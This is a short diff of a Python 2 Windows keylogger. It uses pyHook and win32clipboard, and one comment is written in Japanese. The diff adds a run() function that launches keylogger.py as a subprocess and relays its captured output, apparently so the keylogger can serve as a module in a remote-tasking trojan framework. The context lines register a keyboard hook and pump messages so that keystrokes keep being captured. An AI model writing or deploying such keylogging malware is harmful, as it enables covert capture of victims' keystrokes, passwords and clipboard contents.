@@ -4,6 +4,9 @@ import pythoncom
 import pyHook
 import win32clipboard
 import sys
+import subprocess
+import time
+import os
 
 user32   = windll.user32
 kernel32 = windll.kernel32
@@ -78,3 +81,18 @@ kl.KeyDown = KeyStroke
 # フックの登録と実行を継続
 kl.HookKeyboard()
 pythoncom.PumpMessages()
+
+def run(**args):
+
+	print "[*] In main_out module."
+
+	cmd = [sys.executable, 'keylogger.py']
+
+	p = subprocess.Popen(cmd,
+  	stdout=subprocess.PIPE,
+  	stderr=subprocess.STDOUT)
+
+#for line in p.stdout:
+#    print line,
+	for line in iter(p.stdout.readline, b''):
+  		print str(line)
